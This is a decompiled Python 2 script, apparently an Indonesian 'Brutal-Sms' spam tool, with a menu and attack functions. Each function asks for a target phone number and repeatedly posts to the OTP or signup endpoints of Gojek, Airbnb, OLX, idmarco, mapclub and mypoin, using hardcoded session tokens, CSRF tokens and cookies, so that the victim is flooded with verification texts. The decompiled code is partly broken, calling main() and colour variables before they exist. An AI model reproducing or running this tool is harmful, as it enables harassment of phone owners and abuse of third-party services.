# Filenames : <Sazxt>
# python bytecode : 2.7
# Time Succses Parser : Mon Jul  6 12:24:57 2020
# Auto Parser Dis Version : 1.1.0
# Source : https://www.github.com/Datez-Kun

try:
    import os, time, sys, requests, random, datetime, mechanize, json, re, subprocess as sp
    from time import sleep
    from requests import post
    from cookielib import LWPCookieJar as Cookie
    from requests.exceptions import ConnectionError
except:
    print p + '{' + m + '!' + p + '} ' + m + 'Module Requests Belum Terpasang\n' + p + '{' + m + '!' + p + '} ' + bi + 'Sedang Memasang' + p + '...'
    time.sleep(2)
    os.system('pip2 install requests')
    print p + '{' + h + '\xe2\x9c\x93' + p + '} ' + h + 'Module Terinstall'
    time.sleep(1)
    meki = raw_input(p + '{' + h + '\xe2\x80\xa2' + p + '} ' + u + 'Masuk Ke Tools Nya ' + p + '{' + bi + 'y/n' + p + '}' + m + ': ' + h)
    time.sleep(0.5)
    if meki == 'y' or meki == 'Y':
        time.sleep(0.5)
        main()
    elif meki == 'n' or meki == 'N':
        keluar()
    else:
        print p + '{' + m + '!' + p + '} ' + m + 'Wrong Input' + m + '!!'
        keluar()

h = '\x1b[1;92m'
bi = '\x1b[1;96m'
k = '\x1b[1;93m'
u = '\x1b[1;95m'
pu = '\x1b[1;97m'
b = '\x1b[1;94m'
m = '\x1b[1;91m'
hi = '\x1b[1;30m'
hg = '\x1b[4;92m'
p = '\x1b[0m'

def run(s):
    for x in s + '\n':
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.001)


def keluar():
    time.sleep(0.5)
    print p + '{' + m + '!' + p + '} ' + m + 'Exit'
    sys.exit()


def info():
    os.system('clear')
    time.sleep(0.2)
    run(hi + '   ~  ~   ' + h + '\xe2\x94\x8c\xe2\x88\xa9\xe2\x94\x90' + p + '(' + m + '\xe2\x97\xa3' + hi + '_' + m + '\xe2\x97\xa2' + p + ')' + h + '\xe2\x94\x8c\xe2\x88\xa9\xe2\x94\x90' + hi + '   ~  ~')
    run(m + '\xe2\x94\x8c\xe2\x94\xac\xe2\x94\x90  ' + pu + '\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac \xe2\x94\xac\xe2\x94\x8c\xe2\x94\xac\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x90   ' + m + '\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90' + pu + '\xe2\x94\x8c\xe2\x94\xac\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90')
    run(m + ' \xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x80\xe2\x94\x90' + pu + '\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x82 \xe2\x94\x82 \xe2\x94\x82 \xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4 \xe2\x94\x82   ' + m + '\xe2\x94\x94\xe2\x94\x80\xe2\x94\x90' + pu + '\xe2\x94\x82\xe2\x94\x82\xe2\x94\x82\xe2\x94\x94\xe2\x94\x80\xe2\x94\x90')
    run(m + ' \xe2\x94\xb4\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98' + pu + '\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98 \xe2\x94\xb4 \xe2\x94\xb4 \xe2\x94\xb4 \xe2\x94\x94\xe2\x94\x80\xe2\x94\x98 ' + m + '\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98' + pu + '\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98 ' + k + 'V2.0')
    run(b + '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
    run(p + '{' + h + '\xe2\x80\xa2' + p + '} ' + k + 'Author  ' + m + ': ' + bi + 'Sanz')
    run(p + '{' + h + '\xe2\x80\xa2' + p + '} ' + k + 'Youtube ' + m + ': ' + bi + 'SANZ SOEKAMTI')
    run(p + '{' + h + '\xe2\x80\xa2' + p + '} ' + k + 'Github  ' + m + ': ' + hg + 'github.com/B4N954N2-ID' + p)
    run(p + '{' + h + '\xe2\x80\xa2' + p + '} ' + k + 'Code    ' + m + ': ' + pu + 'python 2')
    run(p + '{' + h + '\xe2\x80\xa2' + p + '} ' + k + 'Note    ' + m + ': ' + pu + 'Untuk Menghentikan Spam Nya')
    run('              Klik Ctrl + C')
    run(p + '{' + h + '\xe2\x80\xa2' + p + '} ' + k + 'Forum Diskusi' + m + ': ' + hg + 'https://bit.ly/2y619B9' + p)
    run(b + '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
    run(p + '{' + h + 'R' + p + '} ' + u + 'Report Bug')
    run(p + '{' + h + 'B' + p + '} ' + u + 'Back To Menu')
    run(p + '{' + h + 'E' + p + '} ' + m + 'Exit')
    run(b + '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
    try:
        requests.get('https://google.com')
    except ConnectionError:
        print p + '{' + m + '!' + p + '} ' + m + 'Check Your Connection'
        sys.exit()

    sanz = raw_input(p + '{' + h + '\xe2\x80\xa2' + p + '}' + m + '> ' + pu + 'Choose ' + m + ': ' + h)
    if sanz == 'b' or sanz == 'B':
        try:
            time.sleep(1)
            menu()
        except ConnectionError:
            print p + '{' + m + '!' + p + '} ' + m + 'Check Your Connection'
            exit()
        except KeyboardInterrupt:
            print p + '{' + m + '!' + p + '} ' + m + 'Ctrl + Detected'
            time.sleep(0.5)
            os.system('xdg-open https://youtube.com/SanzSoekamti')
            time.sleep(1)
            exit()

    elif sanz == 'r' or sanz == 'R':
        try:
            os.system('xdg-open http://wa.me/6285211611180?text=Assalamualaikum.%0ABang%20Sanz.%20Saya%20User%20Brutal-Sms,%20Saya%20Nemu%20Kesalahan%20Di%20Script%20Brutal-Sms:%0A')
            sleep(2)
            print p + '{' + h + '+' + p + '} ' + h + 'Hayo Abis Report Apa Cuk? Awokawok :v'
            time.sleep(1)
            raw_input(p + '{' + m + '!' + p + '} ' + u + 'Enter returns to the menu' + m + ':')
            time.sleep(1)
            menu()
        except ConnectionError:
            print p + '{' + m + '!' + p + '} ' + m + 'Check Your Connection'
            exit()
        except KeyboardInterrupt:
            print p + '{' + m + '!' + p + '} ' + m + 'Ctrl + Detected'
            time.sleep(0.5)
            os.system('xdg-open https://youtube.com/SanzSoekamti')
            time.sleep(1)
            exit()

    elif sanz == 'e' or sanz == 'E':
        keluar()
    else:
        print p + '{' + m + '!' + p + '} ' + m + 'Wrong Input' + m + '!!'
        time.sleep(1)
        info()


def gp():
    os.system('clear')
    time.sleep(0.2)
    logo()
    run(p + '{' + h + '+' + p + '} ' + u + 'Contoh ' + m + ': ' + p + '628xxxxxxxxxx')
    no = raw_input(p + '{' + h + '+' + p + '} ' + u + 'Target ' + m + ': ' + p)
    jml = input(p + '{' + h + '+' + p + '} ' + u + 'Jumlah Spam ' + m + ': ' + p)
    if jml > 5:
        run(b + '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
        time.sleep(0.2)
        print p + '{' + m + '!' + p + '} ' + m + 'Jumlah Terlalu Besar'
        time.sleep(1)
        cs()
    run(b + '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
    ua = {'X-Session-ID': 'f8b67b26-c6a4-44d2-9d86-8d93a80901c9', 'X-Platform': 'Android', 'X-UniqueId': '8606f4e3b85968fd', 'X-AppVersion': '3.52.2', 'X-AppId': 'com.gojek.app', 'Accept': 'application/json', 'Authorization': 'Bearer', 'X-User-Type': 'customer', 'Accept-Language': 'id-ID', 'X-User-Locale': 'id_ID', 'Host': 'api.gojekapi.com', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.12.1'}
    dat = {'email': 'nsjwwiwiwisnsnn12@gmail.com', 'name': 'akuinginterbang12', 'phone': no, 'signed_up_country': 'ID'}
    for x in range(int(jml)):
        time.sleep(5)
        send = requests.post('https://api.gojekapi.com/v5/customers', data=dat, headers=ua)
        if 'success' in send.text:
            print p + '{' + h + '\xe2\x9c\x93' + p + '} ' + h + 'Spam Sms ' + k + no + p + ' {' + h + 'Success' + p + '}'
        else:
            print p + '{' + m + 'x' + p + '} ' + h + 'Spam Sms ' + k + no + p + ' {' + u + 'Gagal' + p + '}'

    lagi()


def anb():
    os.system('clear')
    time.sleep(0.2)
    logo()
    run(p + '{' + h + '+' + p + '} ' + u + 'Contoh ' + m + ': ' + p + '628xxxxxxxxxx')
    no = raw_input(p + '{' + h + '+' + p + '} ' + u + 'Target ' + m + ': ' + p)
    jml = input(p + '{' + h + '+' + p + '} ' + u + 'Jumlah Spam ' + m + ': ' + p)
    if jml > 10:
        run(b + '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
        time.sleep(0.2)
        print p + '{' + m + '!' + p + '} ' + m + 'Jumlah Terlalu Besar'
        time.sleep(1)
        anb()
    run(b + '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
    ua = {'origin': 'https://www.airbnb.co.id', 'x-csrf-token': 'V4$.airbnb.co.id$pgPRrSWF_-4$VvFL20hLPGSifNfUZuQFk0hBSM2sFv7ptbLjEn1qEp0=', 'x-csrf-without-token': '1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36', 'content-type': 'application/json', 'accept': 'application/json, text/javascript, */*; q=0.01', 'cache-control': 'no-cache', 'x-requested-with': 'XMLHttpRequest', 'referer': 'https://www.airbnb.co.id/signup_login', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    data = {'phoneNumber': no, 'workFlow': 'GLOBAL_SIGNUP_LOGIN', 'otpMethod': 'TEXT'}
    datajson = json.dumps(data)
    for _ in range(int(jml)):
        time.sleep(5)
        send = r.post('https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id', data=datajson, headers=ua)
        if 'success' in send.text:
            print p + '{' + h + '\xe2\x9c\x93' + p + '} ' + h + 'Spam Sms ' + k + no + p + ' {' + h + 'Success' + p + '}'
        else:
            print p + '{' + m + 'x' + p + '} ' + h + 'Spam Sms ' + k + no + p + ' {' + u + 'Gagal' + p + '}'

    lagi()


def olxx():
    os.system('clear')
    time.sleep(0.2)
    logo()
    run(p + '{' + h + '+' + p + '} ' + u + 'Contoh ' + m + ': ' + p + '08xxxxxxxxxx')
    no = raw_input(p + '{' + h + '+' + p + '} ' + u + 'Target ' + m + ': ' + p)
    jml = input(p + '{' + h + '+' + p + '} ' + u + 'Jumlah Spam ' + m + ': ' + p)
    if jml > 10:
        run(b + '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
        time.sleep(0.2)
        print p + '{' + m + '!' + p + '} ' + m + 'Jumlah Terlalu Besar'
        time.sleep(1)
        olxx()
    run(b + '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36', 'referer': 'https://www.olx.co.id/'}
    r = requests.Session()
    r.cookies = Cookie('.cookieslog')
    r.headers = headers
    data = {'grantType': 'phone', 'phone': no, 'language': ''}
    for _ in range(int(jml)):
        time.sleep(5)
        postData = r.post('https://www.olx.co.id/api/auth/authenticate', json=data, allow_redirects=True)
        if 'PIN' and 'token' in postData.text:
            print p + '{' + h + '\xe2\x9c\x93' + p + '} ' + h + 'Spam Sms ' + k + no + p + ' { ' + h + 'Success ' + p + '}'
        else:
            print p + '{' + m + 'x' + p + '} ' + h + 'Spam Sms ' + k + no + p + ' { ' + u + 'Gagal ' + p + '}'

    lagi()


def idm():
    os.system('clear')
    time.sleep(0.2)
    logo()
    run(p + '{' + h + '+' + p + '} ' + u + 'Contoh ' + m + ': ' + p + '08xxxxxxxxxx')
    no = raw_input(p + '{' + h + '+' + p + '} ' + u + 'Target ' + m + ': ' + p)
    jml = input(p + '{' + h + '+' + p + '} ' + u + 'Jumlah Spam ' + m + ': ' + p)
    if jml > 10:
        run(b + '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
        time.sleep(0.2)
        print p + '{' + m + '!' + p + '} ' + m + 'Jumlah Terlalu Besar'
        time.sleep(1)
        idm()
    run(b + '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
    ua = {'Host': 'www.idmarco.com', 'accept': '*/*', 'x-requested-with': 'XMLHttpRequest', 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36'}
    dat = {'phone': no}
    for _ in range(int(jml)):
        time.sleep(5)
        r = requests.post('https://www.idmarco.com/smsotp/login/sendotp/', data=dat, headers=ua)
        if r:
            print p + '{' + h + '\xe2\x9c\x93' + p + '} ' + h + 'Spam Sms ' + k + no + p + ' { ' + h + 'Success ' + p + '}'
        else:
            print p + '{' + m + 'x' + p + '} ' + h + 'Spam Sms ' + k + no + p + ' { ' + u + 'Gagal ' + p + '}'

    lagi()


def mc():
    os.system('clear')
    time.sleep(0.2)
    logo()
    run(p + '{' + h + '+' + p + '} ' + u + 'Contoh ' + m + ': ' + p + '08xxxxxxxxxx')
    no = raw_input(p + '{' + h + '+' + p + '} ' + u + 'Target ' + m + ': ' + p)
    jml = input(p + '{' + h + '+' + p + '} ' + u + 'Jumlah Spam ' + m + ': ' + p)
    if jml > 10:
        run(b + '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
        time.sleep(0.2)
        print p + '{' + m + '!' + p + '} ' + m + 'Jumlah Terlalu Besar'
        time.sleep(1)
        mc()
    run(b + '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
    ua = {'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36', 'Referer': 'https://www.mapclub.com/en/user/signup'}
    dat = {'phone': no}
    for _ in range(int(jml)):
        time.sleep(5)
        r = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
        if 'ok' in r.text:
            print p + '{' + h + '\xe2\x9c\x93' + p + '} ' + h + 'Spam Sms ' + k + no + p + ' { ' + h + 'Success ' + p + '}'
        else:
            print p + '{' + m + 'x' + p + '} ' + h + 'Spam Sms ' + k + no + p + ' { ' + u + 'Gagal ' + p + '}'

    lagi()


def mp():
    os.system('clear')
    time.sleep(0.2)
    logo()
    run(p + '{' + h + '+' + p + '} ' + u + 'Contoh ' + m + ': ' + p + '08xxxxxxxxxx')
    no = raw_input(p + '{' + h + '+' + p + '} ' + u + 'Target ' + m + ': ' + p)
    jml = input(p + '{' + h + '+' + p + '} ' + u + 'Jumlah Spam ' + m + ': ' + p)
    if jml > 10:
        run(b + '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
        time.sleep(0.2)
        print p + '{' + m + '!' + p + '} ' + m + 'Jumlah Terlalu Besar'
        time.sleep(1)
        mp()
    run(b + '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
    head = {'Host': 'mypoin.id', 'content-length': '104', 'accept': 'application/json, text/javascript, */*; q=0.01', 'sec-fetch-dest': 'empty', 'x-requested-with': 'XMLHttpRequest', 'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://mypoin.id', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'referer': 'https://mypoin.id/register/validate-phone-number', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cookie': '__cfduid=dbf8226ca73eaed7de2b25941dc06183e1591828722', 'cookie': '_ga=GA1.2.121781716.1591828745', 'cookie': '_gid=GA1.2.1452578097.1591828745', 'cookie': '_gat_gtag_UA_108385159_1=1', 'cookie': 'csrftoken=JHORXxn6RJ9q8oUg2s1K4pA5e13nVkxwOpswJzpT4pwU9LAXf2sRvsddpwYoTZZM'}
    dat = {'phone': no + '&', 'csrfmiddlewaretoken': 'KSNW5PdHL3zekNPQbceTOGe5kodnJthpPArBRRfuYJWIlavxoMF0fJRdvT8oH8JF'}
    for _ in range(int(jml)):
        time.sleep(5)
        send = requests.post('https://mypoin.id/register/request-otp', data=dat, headers=head)
        if 'ok' in send.text:
            print p + '{' + h + '\xe2\x9c\x93' + p + '} ' + h + 'Spam Sms ' + k + no + p + ' { ' + h + 'Success ' + p + '}'
        else:
            print p + '{' + m + 'x' + p + '} ' + h + 'Spam Sms ' + k + no + p + ' { ' + u + 'Gagal ' + p + '}'

    lagi()


def lagi():
    os.system('xdg-open https://youtu.be/iI0DDdls9Fc')
    time.sleep(1)
    l = raw_input(p + '{' + m + '?' + p + '} ' + u + 'Mau Spam Lagi? ' + p + '{' + bi + 'y/n' + p + '}' + m + ': ' + h)
    if l == 'y' or l == 'Y':
        time.sleep(1)
        main()
    elif l == 'n' or l == 'N':
        keluar()
    else:
        print p + '{' + m + '!' + p + '} ' + m + 'Wrong Input' + m + '!!'
        time.sleep(1)
        lagi()


def logo():
    run(hi + '   ~  ~   ' + h + '\xe2\x94\x8c\xe2\x88\xa9\xe2\x94\x90' + p + '(' + m + '\xe2\x97\xa3' + hi + '_' + m + '\xe2\x97\xa2' + p + ')' + h + '\xe2\x94\x8c\xe2\x88\xa9\xe2\x94\x90' + hi + '   ~  ~')
    run(m + '\xe2\x94\x8c\xe2\x94\xac\xe2\x94\x90  ' + pu + '\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac \xe2\x94\xac\xe2\x94\x8c\xe2\x94\xac\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x90   ' + m + '\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90' + pu + '\xe2\x94\x8c\xe2\x94\xac\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90')
    run(m + ' \xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x80\xe2\x94\x90' + pu + '\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x82 \xe2\x94\x82 \xe2\x94\x82 \xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4 \xe2\x94\x82   ' + m + '\xe2\x94\x94\xe2\x94\x80\xe2\x94\x90' + pu + '\xe2\x94\x82\xe2\x94\x82\xe2\x94\x82\xe2\x94\x94\xe2\x94\x80\xe2\x94\x90')
    run(m + ' \xe2\x94\xb4\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98' + pu + '\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98 \xe2\x94\xb4 \xe2\x94\xb4 \xe2\x94\xb4 \xe2\x94\x94\xe2\x94\x80\xe2\x94\x98 ' + m + '\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98' + pu + '\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98 ' + k + 'V2.0')
